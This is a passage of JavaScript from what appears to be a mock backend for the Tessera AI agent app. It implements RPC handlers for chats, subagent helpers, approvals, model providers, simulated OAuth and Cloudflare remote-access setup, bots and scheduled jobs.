      res.branch = branch.info;
    }
    // Tell the agent what no longer matches its history.
    let note = null;
    if (files && !conversation && (res.restored.length || res.deleted.length)) {
      note = `[Rewind] The user put files back as they were after entry ${toSeq} of this conversation; the edits made since are undone.`;
      if (res.restored.length) note += ` Restored: ${res.restored.join(', ')}.`;
      if (res.deleted.length) note += ` Deleted: ${res.deleted.join(', ')}.`;
    } else if (!files && conversation && changed.size) {
      note = `[Rewind] The user rewound the conversation to this point, but the files changed after it were kept as they are now: ${[...changed.keys()].join(', ')}.`;
    }
    if (note) {
      if (res.skipped.length) note += ` Left as they are: ${res.skipped.map((x) => x.path).join(', ')}.`;
      if (res.not_undone.length) note += ' Changes made by shell commands were not undone.';
      addEntry(rec, { kind: 'user', content: [{ type: 'text', text: note }], author: 'harness' });
      emitSession(rec);
    }
    res.session = rec.info;
    return res;
  },
  send(p) {
    const rec = getRec(p);
    if (rec.info.kind === 'channel' && rec.info.bot_id) throw badRequest('Private conversations between bots are read-only');
    if (rec.info.parent_call && rec.info.helper_owner !== 'tessera') throw badRequest("This helper works on what the main chat gave it and takes no messages. Write in the main chat instead.");
    const content = (Array.isArray(p.content) ? p.content : []).filter((c) =>
      (c?.type === 'text' && typeof c.text === 'string') || (c?.type === 'image' && typeof c.data === 'string'));
    const files = Array.isArray(p.attachments) ? p.attachments : []; // older clients send none
    if (files.length) attach(rec, content, files);
    if (!textOf(content).trim() && !content.some((c) => c.type === 'image')) throw badRequest('Message is empty');
    const delivery = oneOf(p.delivery ?? 'auto', ['auto', 'steer', 'follow_up', 'interrupt'], 'delivery');
    state.sends.push({ session_id: rec.info.id, tiled: state.mosaics.mosaics.some((m) => m.tiles.some((t) => t.session_id === rec.info.id)), at: now() });
    if (delivery === 'interrupt') {
      interrupt(rec, { content });
      return null;
    }
    if (rec.turn) {
      // While a turn runs, auto and follow_up queue a follow-up (run once the turn ends); only an explicit
      // steer is read at the next step. Rooms have no single turn to steer: everything queues there.
      if (delivery !== 'steer' || rec.info.kind === 'channel') rec.followups.push({ content });
      else rec.steers.push({ content });
      emitQueue(rec);
      return null;
    }
    if (rec.compactTimer || rec.info.status === 'compacting') { // runs once the compaction is done
      rec.followups.push({ content });
      emitQueue(rec);
      return null;
    }
    beginTurn(rec, content);
    return null;
  },
  abort(p) {
    const rec = getRec(p);
    // engine.rs Request::Abort: one of Claude Code's subagents stops alone (`stop_task`); its chat's turn goes on.
    if (rec.info.parent_call && !rec.turn && !state.slots.queue.some((w) => w.id === rec.info.id)) {
      if (rec.info.status === 'running' || rec.info.status === 'awaiting_approval') {
        rec.info.status = 'interrupted';
        emitSession(rec);
      }
      return null;
    }
    const helpers = [...state.sessions.values()]
      .filter((c) => c.info.parent_id === rec.info.id && c.info.kind === 'subagent' && !c.info.internal
        && (c.turn || ['running', 'awaiting_approval'].includes(c.info.status) || state.slots.queue.some((w) => w.id === c.info.id)))
      .sort((a, b) => a.info.created_at - b.info.created_at);
    if (helpers.length) addEntry(rec, { kind: 'notice', level: 'info', text:
      `Stopping this chat, including ${helpers.length} ${helpers.length === 1 ? 'helper' : 'helpers'}: ${helpers.map((c) => c.info.title.replace(/^↳ /, '')).join(', ')}.` });
    // Claude's watch-only helpers end with its interrupted parent turn too.
    for (const child of helpers.filter((c) => c.info.parent_call)) {
      child.info.status = 'interrupted';
      emitSession(child);
    }
    if (rec.sendNow.length) { // Stop means stop: what was being sent now waits first in the queue, then the steers
      const mine = rec.steers.filter((w) => !w.author);
      for (const w of mine) rec.steers.splice(rec.steers.indexOf(w), 1);
      rec.followups.unshift(...rec.sendNow.splice(0), ...mine);
      emitQueue(rec);
    }
    unqueueChild(rec.info.id); // a subagent still waiting for a slot never starts
    abortTurn(rec);
    // engine.rs Request::Abort: "Stop means stop: including subagents this chat left running, and bots working for it."
    stopBackground(rec);
    stopBotHandoffs(rec);
    return null;
  },
  compact(p) {
    const rec = getRec(p);
    if (rec.turn || rec.compactTimer || rec.info.status === 'compacting') throw new RpcError('busy', 'Session is busy: wait for the turn to finish or abort it first');
    const lastUser = rec.entries.findLast((e) => e.kind === 'user');
    if (!lastUser) throw badRequest('Nothing to compact yet');
    const instructions = typeof p.instructions === 'string' && p.instructions.trim() ? p.instructions.trim() : null;
    setStatus(rec, 'compacting');
    rec.compactTimer = setTimeout(() => {
      rec.compactTimer = null;
      const before = rec.info.context.tokens;
      const after = Math.min(before, Math.max(800, Math.round(before * 0.15)));
      const external = rec.info.model.provider === 'claude-code';
      addEntry(rec, { kind: 'compaction', external, summary: external ? '' : compactionSummary(rec, instructions), first_kept_seq: external ? 0 : lastUser.seq, tokens_before: before, tokens_after: after });
      rec.info.context.source = external ? 'reported' : 'estimated';
      rec.info.context.tokens = after;
      rec.info.context.compactions += 1;
      if (rec.sendNow.length) handOff(rec);
      else if (rec.followups.length) drainQueue(rec);
      else if (!maybeSummarize(rec)) setStatus(rec, 'idle');
    }, 1500);
    return null;
  },
  respond_approval(p) {
    const rec = getRec(p);
    const requestId = need(p, 'request_id');
    const decision = oneOf(need(p, 'decision'), ['allow', 'allow_session', 'deny'], 'decision');
    const req = rec.approvals.find((a) => a.id === requestId);
    if (!req) throw notFound(`No pending approval ${requestId}`);
    rec.approvals = rec.approvals.filter((a) => a !== req);
    // A machine that asks every time (`once`): nothing is remembered (engine/webview.rs approve_now).
    if (decision === 'allow_session' && !req.once) rec.allowed.add(req.summary);
    broadcast({ type: 'approval_resolved', session_id: rec.info.id, request_id: req.id, decision });
    rec.info.status = 'running';
    emitSession(rec);
    rec.turn?.resolveApproval(req.id, decision);
    return null;
  },
  search(p) {
    const q = String(p.query ?? '').trim().toLowerCase();
    const limit = Math.max(1, Math.min(500, Number(p.limit) || 20));
    const hits = [];
    if (!q) return hits;
    const recs = [...state.sessions.values()].filter((r) => !r.info.private) // private chats are never searchable
      .sort((a, b) => b.info.updated_at - a.info.updated_at);
    for (const rec of recs) {
      for (let i = rec.entries.length - 1; i >= 0 && hits.length < limit; i--) {
        const e = rec.entries[i];
        const text = entryText(e);
        const at = text.toLowerCase().indexOf(q);
        if (at < 0) continue;
        const start = Math.max(0, at - 40), end = Math.min(text.length, at + q.length + 40);
        // The real server's FTS5 snippet marks the hit with «…».
        const snippet = (start > 0 ? '…' : '') + text.slice(start, at) + '«' + text.slice(at, at + q.length) + '»' + text.slice(at + q.length, end) + (end < text.length ? '…' : '');
        hits.push({ session_id: rec.info.id, session_title: rec.info.title || 'Untitled', seq: e.seq, snippet });
      }
      if (hits.length >= limit) break;
    }
    return hits;
  },

  list_providers() {
    return markSmall(markFast(state.providers));
  },
  save_provider(p) {
    const spec = need(p, 'spec');
    const id = String(spec.id ?? '').trim();
    if (!/^[a-z0-9][a-z0-9._-]*$/i.test(id)) throw badRequest('Provider id must be letters, digits, ".", "_" or "-"');
    const kind = oneOf(spec.kind, KINDS, 'provider kind');
    const existing = state.providers.find((x) => x.id === id);
    if (typeof spec.api_key === 'string' && spec.api_key) state.providerKeys.set(id, spec.api_key);
    const hasKey = state.providerKeys.has(id);
    const auth = kind === 'openai_codex' ? 'oauth' : kind === 'openai_chat' && !hasKey ? 'none' : 'api_key';
    let models = (Array.isArray(spec.models) ? spec.models : []).filter((m) => m?.id).map((m) => mkModel(
      id, String(m.id), String(m.name || m.id), Number(m.context_window) || 131_072, Number(m.max_output) || 8_192, !!m.reasoning, !!m.vision));
    if (spec.discover && !models.length) models = inventModels(id, kind);
    const authenticated = auth === 'none' || hasKey || (auth === 'oauth' && !!existing?.authenticated);
    const info = {
      id, name: String(spec.name || id), kind, base_url: String(spec.base_url ?? ''), authenticated, auth,
      ...(authenticated && existing?.account ? { account: existing.account } : {}), models,
    };
    if (existing) state.providers[state.providers.indexOf(existing)] = info;
    else state.providers.push(info);
    broadcast({ type: 'providers_changed' });
    return info;
  },
  remove_provider(p) {
    const prov = findProvider(need(p, 'id'));
    state.providers = state.providers.filter((x) => x !== prov);
    state.providerKeys.delete(prov.id);
    if (state.serverInfo.default_model?.provider === prov.id) state.serverInfo.default_model = null;
    broadcast({ type: 'providers_changed' });
    return null;
  },
  start_oauth(p) {
    const prov = findProvider(need(p, 'provider'));
    // Claude accounts sign in through Claude Code itself, never here (its hint says how).
    if (prov.kind === 'claude_code') throw badRequest(prov.id === 'claude-code' ? claudeCodeInfo().hint : claudeAccountInfo(prov).hint);
    if (prov.auth !== 'oauth') throw badRequest(`Provider ${prov.id} does not use OAuth`);
    const old = state.oauthTimers.get(prov.id);
    if (old) { clearTimeout(old); miscTimers.delete(old); }
    state.oauthTimers.set(prov.id, later(10_000, () => {
      state.oauthTimers.delete(prov.id);
      if (!state.providers.includes(prov)) return;
      markSignedIn(prov);
      broadcast({ type: 'notice', session_id: null, level: 'info', message: `Signed in to ${oauthLabel(prov)} as you@example.com` });
    }));
    return {
      url: 'https://auth.openai.com/codex/device',
      instructions: 'Open the link and enter the code to sign in with your ChatGPT account.',
      auto_complete: true,
      user_code: 'QX7T-4MPL',
    };
  },
  complete_oauth(p) {
    const prov = findProvider(need(p, 'provider'));
    if (!String(p.input ?? '').trim()) throw badRequest('Paste the redirected URL or the code');
    markSignedIn(prov);
    return prov;
  },
  logout(p) {
    const prov = findProvider(need(p, 'provider'));
    const timer = state.oauthTimers.get(prov.id);
    if (timer) { clearTimeout(timer); miscTimers.delete(timer); state.oauthTimers.delete(prov.id); }
    state.providerKeys.delete(prov.id);
    if (prov.auth !== 'none') prov.authenticated = false;
    delete prov.account;
    broadcast({ type: 'providers_changed' });
    return null;
  },
  set_default_model(p) {
    const m = modelRef(need(p, 'model'));
    const prov = findProvider(m.provider);
    if (!prov.models.some((x) => x.id === m.model)) throw notFound(`Model not found: ${m.provider}/${m.model}`);
    state.serverInfo.default_model = m;
    return null;
  },
  set_model_small(p) { // engine/small.rs: kept per model whether or not it's listed; "auto" removes it
    const provider = String(need(p, 'provider')).trim();
    const model = String(need(p, 'model')).trim();
    if (!provider || !model || provider.includes('/')) throw badRequest('name the model as a provider id and a model id');
    const mode = oneOf(need(p, 'mode'), ['auto', 'on', 'off'], 'small model mode');
    if (mode === 'auto') state.smallModes.delete(`${provider}/${model}`);
    else state.smallModes.set(`${provider}/${model}`, mode);
    broadcast({ type: 'providers_changed' });
    return null;
  },

  get_model_roles() {
    return modelRoles();
  },
  // engine/subagents.rs: how many subagents work at once; more open at once, fewer as running ones finish.
  get_helpers() {
    const s = state.slots;
    return { enabled: s.enabled, at_once: s.max, default: MAX_SUBAGENTS, max: HELPER_MAX, steps: s.steps, minutes: s.minutes, capacity: s.capacity };
  },
  set_helpers(p) {
    const whole = (v, what) => {
      const n = Number(v);
      if (!Number.isInteger(n) || n < 0 || n > HELPER_MAX) throw badRequest(`${what} must be a whole number from 1 to ${HELPER_MAX}, or 0 for no limit`);
      return n;
    };
    const s = state.slots;
    const at = whole(need(p, 'at_once'), 'Helpers working at once');
    const steps = p.steps == null ? s.steps : whole(p.steps, 'Steps for each helper');
    const minutes = p.minutes == null ? s.minutes : whole(p.minutes, 'Minutes for each helper');
    Object.assign(s, { max: at, enabled: p.enabled ?? at !== 0, steps, minutes });
    pumpSlots(s);
    return handlers.get_helpers();
  },
  set_chat_helpers(p) {
    const rec = getRec(p);
    if (rec.info.kind === 'subagent') throw badRequest("helpers can't start helpers; set the limits on the chat that started it");
    const limits = need(p, 'limits') ?? {};
    const own = {};
    for (const [key, what] of [['at_once', 'Helpers working at once'], ['steps', 'Steps for each helper'], ['minutes', 'Minutes for each helper']]) {
      if (limits[key] == null) continue;
      const n = Number(limits[key]);
      if (!Number.isInteger(n) || n < 0 || n > HELPER_MAX) throw badRequest(`${what} must be a whole number from 1 to ${HELPER_MAX}, or 0 for no limit`);
      own[key] = n;
    }
    if (Object.keys(own).length) rec.info.helper_limits = own;
    else delete rec.info.helper_limits;
    rec.info.updated_at = Date.now();
    emitSession(rec);
    pumpSlots(state.slots);
    return rec.info;
  },
  set_model_role(p) {
    let role = String(need(p, 'role')).trim();
    if (role === 'fast') role = 'utility';
    if (!/^[a-z][a-z0-9_-]*$/i.test(role)) throw badRequest('a role name is letters, digits, "-" or "_"');
    const value = p.model == null ? '' : String(p.model).trim();
    if (!value) {
      if (role === 'default') state.serverInfo.default_model = null;
      state.roles.delete(role);
      broadcast({ type: 'providers_changed' });
      return modelRoles();
    }
    if (value.startsWith('@')) {
      const target = value.slice(1) === 'fast' ? 'utility' : value.slice(1);
      if (!BUILTIN_ROLES.some(([n]) => n === target) && !state.roles.has(target)) throw badRequest(`no role called @${target}`);
      // Refuse cycles (a role naming itself, directly or through others).
      const seen = new Set([role]);
      for (let at = target; at;) {
        if (seen.has(at)) throw badRequest(`@${role} can't follow @${target}: that goes round in a circle`);
        seen.add(at);
        const next = at === 'default' ? null : state.roles.get(at);
        at = next && next.startsWith('@') ? (next.slice(1) === 'fast' ? 'utility' : next.slice(1)) : null;
      }
    } else {
      const m = parseRef(value);
      const prov = state.providers.find((x) => x.id === m.provider);
      if (!prov || !prov.models.some((x) => x.id === m.model)) throw badRequest(`no model \`${value}\``);
      if (role === 'default') state.serverInfo.default_model = m;
    }
    if (role !== 'default') state.roles.set(role, value);
    broadcast({ type: 'providers_changed' }); // like the engine: other devices refresh
    return modelRoles();
  },

  setup_status() {
    const dm = state.serverInfo.default_model;
    const prov = dm ? state.providers.find((x) => x.id === dm.provider) : null;
    const known = !!prov?.models.some((m) => m.id === dm.model);
    return {
      completed: state.setupCompleted,
      has_model: known && prov.authenticated, // a default model that can actually answer
      ...(known ? { default_model: { ...dm } } : {}),
      web_search: state.webSearch.search,
      voice: !!state.voice.enabled,
      remote: state.remote.urls.length > 0,
      devices: state.devices.filter((d) => !d.name.startsWith('Terminal (this machine)')).length,
      sandbox: settingsState().kernel.status, // sandbox::describe(), as in get_security
      server_name: state.serverInfo.name,
      lan: state.lan,
      bind: state.bind,
      restart_needed: state.bind !== state.boundAt,
      e2ee_required: true,
      permission: settingsState().security.default_permission ?? 'ask',
    };
  },
  set_server_bind(p) {
    const bind = String(need(p, 'bind')).trim();
    const m = /^(127\.0\.0\.1|0\.0\.0\.0|\[::1\]|\[::\]):(\d{1,5})$/.exec(bind);
    if (!m || +m[2] < 1 || +m[2] > 65535) throw badRequest('bind must be 127.0.0.1:<port> (this computer) or 0.0.0.0:<port> (the network)');
    state.bind = bind;
    return handlers.setup_status();
  },
  complete_setup() {
    state.setupCompleted = true;
    return null;
  },
  // ── CLAUDE-CODE block: the user's own Claude Code (engine/claude_code.rs) ──
  claude_code_status(p) { // `provider`: another Claude account (accounts.rs); default the usual one
    const id = typeof p.provider === 'string' && p.provider ? p.provider : 'claude-code';
    if (id === 'claude-code') return { ...claudeCodeInfo(), provider: 'claude-code' };
    const prov = state.providers.find((x) => x.id === id && x.kind === 'claude_code');
    if (!prov) throw notFound(`no Claude account \`${id}\``);
    if (p.refresh && state.claudeAccountsReady?.has(id)) markClaudeAccount(prov, true);
    return claudeAccountInfo(prov);
  },
  // ── end of CLAUDE-CODE block ──
  // ── ACCOUNTS (accounts.rs): more ChatGPT sign-ins and Claude accounts, each with the user's name ──
  add_account(p) {
    const kind = oneOf(p.kind, [...KINDS, 'claude_code'], 'provider kind');
    const name = String(p.name ?? '').replace(/\s+/g, ' ').trim().slice(0, 40);
    if (!name) throw badRequest('give the account a name, such as Work');
    if (kind !== 'openai_codex' && kind !== 'claude_code') throw badRequest('only ChatGPT and Claude subscriptions take more accounts; add another service with its own key');
    if (state.providers.filter((x) => x.kind === kind).length >= 8) throw badRequest('8 accounts of one kind at most; remove one first');
    if (kind === 'claude_code' && claudeCodeState === 'missing') throw badRequest(claudeCodeInfo().hint);
    const base = kind === 'openai_codex' ? 'openai-codex' : 'claude-code';
    const slug = name.toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '').slice(0, 24).replace(/-$/, '');
    const stem = slug ? `${base}-${slug}` : base;
    let id = stem;
    for (let n = 2; id === base || state.providers.some((x) => x.id === id); n++) id = `${stem}-${n}`;
    const info = {
      id, name: accountLabel(kind, name), kind, base_url: kind === 'openai_codex' ? 'https://chatgpt.com/backend-api/codex' : '',
      authenticated: false, auth: 'oauth',
      models: kind === 'openai_codex'
        ? inventModels(id, kind)
        : [mkModel(id, 'opus', 'Opus (latest)', 200_000, 64_000, true, true), mkModel(id, 'sonnet', 'Sonnet (latest)', 200_000, 64_000, true, true), mkModel(id, 'haiku', 'Haiku (latest)', 200_000, 64_000, true, true)],
    };
    state.providers.push(info);
    broadcast({ type: 'providers_changed' });
    return info;
  },
  rename_provider(p) {
    const prov = findProvider(need(p, 'id'));
    const name = String(p.name ?? '').replace(/\s+/g, ' ').trim().slice(0, 60);
    if (!name) throw badRequest('give it a name');
    prov.name = accountLabel(prov.kind, name);
    broadcast({ type: 'providers_changed' });
    return prov;
  },
  get_accounts() {
    return { continue_on_next: !!state.accountsContinue };
  },
  set_accounts(p) {
    state.accountsContinue = !!p.continue_on_next;
    return { continue_on_next: state.accountsContinue };
  },
  // ── end of ACCOUNTS ──
  get_guide(p) { // engine guides.rs: the repo's docs/*.md, and the terms, privacy and licences at its top
    const files = {
      security: ['Security', 'SECURITY.md'],
      'remote-access': ['Reach Tessera from anywhere', 'REMOTE_ACCESS.md'],
      'claude-code': ['Your Claude subscription', 'CLAUDE_CODE.md'],
      machines: ['Your machines', 'MACHINES.md'],
      notifications: ['Notifications and files', 'NOTIFICATIONS.md'],
      windows: ['Tessera on Windows', 'WINDOWS.md'],
      'windows-start': ['Getting started on Windows', 'GETTING-STARTED-WINDOWS.md'],
      terms: ['Terms of use', '../TERMS.md'],
      privacy: ['Privacy', '../PRIVACY.md'],
      licences: ['Open-source licences', '../THIRD_PARTY_NOTICES.md'],
    };
    const name = String(need(p, 'name'));
    const g = files[name];
    if (!g) throw notFound(`no guide \`${name}\``);
    const file = path.join(path.dirname(fileURLToPath(import.meta.url)), '../../../../docs', g[1]);
    return { name, title: g[0], markdown: fs.readFileSync(file, 'utf8') };
  },
  async detect_local_models() {
    await sleep(1200); // probing localhost ports
    if (state.noLocalModels) return state.providers;
    if (!state.providers.some((x) => x.id === 'ollama')) {
      state.providers.push({
        id: 'ollama', name: 'Ollama (this computer)', kind: 'openai_chat', base_url: 'http://127.0.0.1:11434/v1',
        authenticated: true, auth: 'none',
        models: [
          mkModel('ollama', 'qwen3:8b', 'Qwen3 8B', 40_960, 8_192, true, false),
          mkModel('ollama', 'gemma3:4b', 'Gemma 3 4B', 131_072, 8_192, false, true),
        ],
      });
    }
    if (!state.providers.some((x) => x.id === 'lm-studio-42')) {
      state.providers.push({
        id: 'lm-studio-42', name: 'LM Studio on 192.168.1.42:1234', kind: 'openai_chat', base_url: 'http://192.168.1.42:1234/v1',
        authenticated: true, auth: 'none',
        models: [mkModel('lm-studio-42', 'qwen3-30b-a3b', 'Qwen3 30B A3B', 32_768, 8_192, true, false)],
      });
    }
    broadcast({ type: 'providers_changed' });
    return state.providers;
  },

  async cloudflare_zones(p) {
    const token = need(p, 'token');
    checkCfToken(token);
    await sleep(600);
    return CF_ZONES.map((z) => ({ ...z, zero_trust: !/nozt/i.test(String(token)) }));
  },
  async cloudflare_setup(p) {
    const token = need(p, 'token'); // used once, never stored
    const zoneId = String(need(p, 'zone_id'));
    const hostname = String(need(p, 'hostname')).trim().replace(/\.+$/, '').toLowerCase();
    checkCfToken(token);
    if (state.remote.tunnel) throw badRequest('remote access through Cloudflare is already set up; remove it first to change it');
    if (state.cloudflareBusy) throw new RpcError('busy', 'a Cloudflare setup is already running');
    const zone = CF_ZONES.find((z) => z.id === zoneId);
    if (!zone) throw badRequest("that domain isn't available to this token");
    if (!(hostname === zone.name || hostname.endsWith(`.${zone.name}`)) || /[\s/]/.test(hostname)) {
      throw badRequest(`the address must be on ${zone.name}, e.g. tessera.${zone.name}`);
    }
    const st = state;
    st.cloudflareBusy = true;
    try {
      await cfSteps(CF_SETUP_STEPS(hostname), /nozt/i.test(String(token)) ? 0 : hostname.includes('fail') ? 4 : -1);
    } finally {
      st.cloudflareBusy = false;
    }
    const r = st.remote;
    const url = `https://${hostname}`;
    if (!r.urls.includes(url)) r.urls.push(url);
    const headers = new Map(r.headers);
    headers.set('CF-Access-Client-Id', `${hex(16)}.access`);
    headers.set('CF-Access-Client-Secret', hex(32));
    r.headers = [...headers];
    r.tunnel = { hostname, tunnel_id: crypto.randomUUID(), key_expires_at: Math.floor(now() / 1000) + KEY_LIFETIME };
    broadcast({ type: 'server_route_changed' });
    return remoteStatus();
  },
  async cloudflare_renew(p = {}) {
    const tunnel = state.remote.tunnel;
    if (!tunnel) throw badRequest("remote access through Cloudflare isn't set up");
    const token = String(p.token ?? '').trim();
    if (token) {
      checkCfToken(token);
      await sleep(500);
      if (/gone/i.test(token)) throw badRequest('Cloudflare no longer has the key Tessera made for your devices (it was deleted). Remove remote access and set it up again.');
    }
    tunnel.key_expires_at = Math.floor(now() / 1000) + KEY_LIFETIME;
    return remoteStatus();
  },
  get_server_route() {
    // Header values are credentials: the server gives them only to the apps' encrypted connections.
    throw new RpcError('unauthorized', "only the Tessera apps' own connections get the server's addresses");
  },
  retire_login(p = {}, conn) {
    const token = String(need(p, 'token')).trim();
    const old = tokenDevices.get(token);
    const dev = old && state.devices.find((d) => d.id === old);
    if (!dev || revokedTokens.has(token)) return null; // already gone
    if (old === conn?.deviceId || dev.browser) throw badRequest("that login isn't one of this device's earlier ones");
    const me = state.devices.find((d) => d.id === conn?.deviceId);
    if (me && dev.named) Object.assign(me, { name: dev.name, named: true });
    handlers.revoke_device({ id: old });
    return null;
  },
  async cloudflare_remove(p) {
    checkCfToken(need(p, 'token'));
    const st = state;
    const tunnel = st.remote.tunnel;
    if (!tunnel) throw badRequest("remote access through Cloudflare isn't set up");
    if (st.cloudflareBusy) throw new RpcError('busy', 'a Cloudflare setup is already running');
    st.cloudflareBusy = true;
    try {
      await cfSteps(CF_REMOVE_STEPS);
    } finally {
      st.cloudflareBusy = false;
    }
    const r = st.remote;
    r.urls = r.urls.filter((u) => u !== `https://${tunnel.hostname}`);
    r.headers = r.headers.filter(([k]) => k !== 'CF-Access-Client-Id' && k !== 'CF-Access-Client-Secret');
    r.tunnel = null;
    broadcast({ type: 'server_route_changed' });
    return remoteStatus();
  },
  remote_status() {
    return remoteStatus();
  },
  async set_web_access(p) {
    const on = !!need(p, 'on');
    const w = state.remote.web;
    if (on) {
      if (!w.available) throw badRequest('this server was built without the web app; install Tessera again on it with Node.js there (the installer then builds the web app too)');
      if (state.remote.tunnel && !w.door) {
        if (!String(p.token ?? '').trim()) throw badRequest('Cloudflare lets only the Tessera apps reach this server; letting browsers reach it needs a Cloudflare API token once (the same kind as for setting up remote access)');
        checkCfToken(p.token);
        await sleep(500);
        w.door = true;
      }
    }
    w.on = on;
    return remoteStatus();
  },
  mock_web_access(p) {
    const w = state.remote.web;
    if (p.available !== undefined) w.available = !!p.available;
    if (p.browsers !== undefined) {
      state.devices = state.devices.filter((d) => !d.browser);
      for (let i = 0; i < Number(p.browsers); i++) state.devices.push({ id: `dev_web_${i}`, name: `Firefox on Windows ${i + 1}`, created_at: Date.now() - 3600_000, last_seen: Date.now() - 60_000, notify: true, browser: true });
    }
    return webAccessStatus();
  },
  server_key() {
    return { key: MOCK_SERVER_KEY, fingerprint: MOCK_FINGERPRINT };
  },

  get_mosaics() {
    return state.mosaics;
  },
  save_mosaics(p) {
    const raw = need(p, 'layout');
    const layout = cleanMosaics(raw);
    if (layout.version !== state.mosaics.version) throw new RpcError('conflict', 'the layout changed on another device: fetch it and try again');
    if (raw.mosaics.length > 32 || raw.mosaics.some((m) => m.tiles.length > 48)) throw badRequest('too many mosaics or tiles');
    return setMosaics({ version: state.mosaics.version + 1, mosaics: layout.mosaics });
  },

  list_bots() {
    return state.bots;
  },
  save_bot(p) {
    const b = need(p, 'bot');
    if (typeof b !== 'object' || Array.isArray(b)) throw badRequest('bot must be an object');
    const id = String(b.id ?? '').trim();
    const existing = id ? botById(id) : null;
    if (id && !existing) throw notFound(`Bot not found: ${id}`);
    const name = String(b.name ?? '').trim();
    if (!name) throw badRequest('Bot name is required');
    const handle = normHandle(b.handle) || normHandle(name);
    if (!handle) throw badRequest('The handle needs at least one letter or digit');
    if (RESERVED_HANDLES.has(handle)) throw badRequest(`The handle @${handle} is reserved`);
    const others = state.bots.filter((x) => x !== existing);
    if (others.some((x) => x.handle === handle)) throw new RpcError('conflict', `The handle @${handle} is already taken`);
    const rawColor = String(b.color ?? '').trim().toLowerCase();
    const taken = new Set(others.map((x) => x.color));
    const color = /^#[0-9a-f]{6}$/.test(rawColor) ? rawColor
      : BOT_PALETTE.find((c) => !taken.has(c)) ?? BOT_PALETTE[hashStr(handle) % BOT_PALETTE.length];
    const tools = oneOf(b.tools ?? 'full', TOOL_PRESETS, 'tool preset');
    const t = now();
    const bot = {
      id: existing?.id ?? `bot_${hex(4)}`, name, handle, avatar: avatarOf(b.avatar, name), color,
      role: String(b.role ?? '').trim(), personality: String(b.personality ?? ''), instructions: String(b.instructions ?? ''),
      ...(b.model != null ? { model: modelRef(b.model) } : {}),
      ...(b.thinking != null ? { thinking: oneOf(b.thinking, THINKING, 'thinking level') } : {}),
      permission: permissionOf(b.permission ?? 'default'),
      tools,
      allowed_tools: tools === 'custom' ? uniq(strings(b.allowed_tools)) : [],
      ...(typeof b.cwd === 'string' && b.cwd.trim() ? { cwd: expandHome(b.cwd.trim()) } : {}),
      own_memory: b.own_memory !== false,
      share_user_profile: b.share_user_profile !== false,
      can_message: uniq(strings(b.can_message).map((h) => (h === '*' ? '*' : normHandle(h))).filter(Boolean)),
      // Left out (an app that doesn't know it): what is set stays.
      ...(typeof b.askable === 'boolean' ? { askable: b.askable } : existing?.askable != null ? { askable: existing.askable } : {}),
      created_at: existing?.created_at ?? t,
      updated_at: t,
    };
    if (existing) state.bots[state.bots.indexOf(existing)] = bot;
    else state.bots.push(bot);
    broadcast({ type: 'bot_updated', bot });
    return bot;
  },
  delete_bot(p) {
    const id = String(need(p, 'id'));
    const bot = botById(id);
    if (!bot) throw notFound(`Bot not found: ${id}`);
    state.bots = state.bots.filter((x) => x !== bot);
    for (const job of state.jobs.filter((j) => j.bot_id === id)) { // its duties go with it
      state.jobs = state.jobs.filter((j) => j !== job);
      broadcast({ type: 'job_removed', id: job.id });
    }
    // Sessions keep their (now dangling) bot_id and members; the UI shows them as a deleted bot.
    broadcast({ type: 'bot_removed', id });
    return null;
  },
  create_channel(p) {
    const title = String(p.title ?? '').trim();
    if (!title) throw badRequest('Channel title is required');
    const members = resolveMembers(p.members ?? []);
    const rec = createSession({ kind: 'channel', title, members, cwd: p.cwd ? expandHome(String(p.cwd)) : undefined });
    return rec.info;
  },

  list_jobs() {
    return state.jobs;
  },
  save_job(p) {
    const j = need(p, 'job');
    const name = String(j.name ?? '').trim();
    if (!name) throw badRequest('Job name is required');
    const next = nextRun(j.schedule);
    if (next == null) throw badRequest(`Invalid schedule \`${j.schedule}\`: use 5 or 6 cron fields or "@every 30m"`);
    const existing = j.id ? state.jobs.find((x) => x.id === j.id) : null;
    const enabled = j.enabled !== false;
    let botId = null;
    if (j.bot_id != null && String(j.bot_id).trim() !== '') {
      const bot = botById(String(j.bot_id).trim());
      if (!bot) throw badRequest(`Unknown bot \`${j.bot_id}\``);
      botId = bot.id;
    }
    const permission = j.permission === 'yolo' ? 'auto' : j.permission;
    // Limits: one left out stays (an older app doesn't know them), 0 takes it away; runs are the server's.
    const until = j.until === undefined ? existing?.until : j.until || undefined;
    const maxRuns = j.max_runs === undefined ? existing?.max_runs : j.max_runs || undefined;
    const runs = existing?.runs ?? 0;
    const over = scheduleOver({ until, max_runs: maxRuns, runs });
    if (enabled && over) throw badRequest(`its schedule is over (${over}): raise or clear \`max_runs\`, or set a later \`until\`, to turn it on`);
    if (enabled && until && next > until) throw badRequest('no run would come before its end date (`until`): set a later one');
    const job = {
      id: j.id || `job_${hex(4)}`, name, schedule: String(j.schedule).trim(), prompt: String(j.prompt ?? ''),
      cwd: expandHome(String(j.cwd || `${HOME}/projects`)),
      ...(j.model?.provider && j.model?.model ? { model: modelRef(j.model) } : {}),
      enabled, permission: PERMISSIONS.includes(permission) ? permission : 'auto',
      ...(botId ? { bot_id: botId } : {}),
      ...(existing?.last_run != null ? { last_run: existing.last_run } : {}),
      ...(enabled ? { next_run: next } : {}),
      ...(existing?.last_session ? { last_session: existing.last_session } : {}),
      ...(existing?.last_status ? { last_status: existing.last_status } : {}),
      ...(existing?.last_end ? { last_end: existing.last_end } : {}),
      ...(until ? { until } : {}),
      ...(maxRuns ? { max_runs: maxRuns } : {}),
      ...(runs ? { runs } : {}),
      ...(!enabled && existing?.ended ? { ended: existing.ended } : {}),
    };
    if (existing) state.jobs[state.jobs.indexOf(existing)] = job;
    else state.jobs.push(job);
    broadcast({ type: 'job_updated', job });
    return job;
  },
  delete_job(p) {
    const id = need(p, 'id');
    if (!state.jobs.some((x) => x.id === id)) throw notFound(`Job not found: ${id}`);
    state.jobs = state.jobs.filter((x) => x.id !== id);
    state.jobRuns = (state.jobRuns ?? []).filter((r) => r.job_id !== id);
    broadcast({ type: 'job_removed', id });
    return null;
  },
  run_job(p) {
    const id = need(p, 'id');
    const job = state.jobs.find((x) => x.id === id);
    if (!job) throw notFound(`Job not found: ${id}`);
    if (jobWorking(job)) throw badRequest("This task's last run is still working, including its helpers; wait for it to finish");
    const bot = job.bot_id ? botById(job.bot_id) : null; // a duty runs as its bot
    const rec = createSession({
      kind: 'job', title: job.name, cwd: job.cwd, model: job.model ?? bot?.model ?? null, permission: job.permission,
      ...(bot ? { bot_id: bot.id, thinking: bot.thinking ?? 'medium' } : {}),
    });
    const started = now();
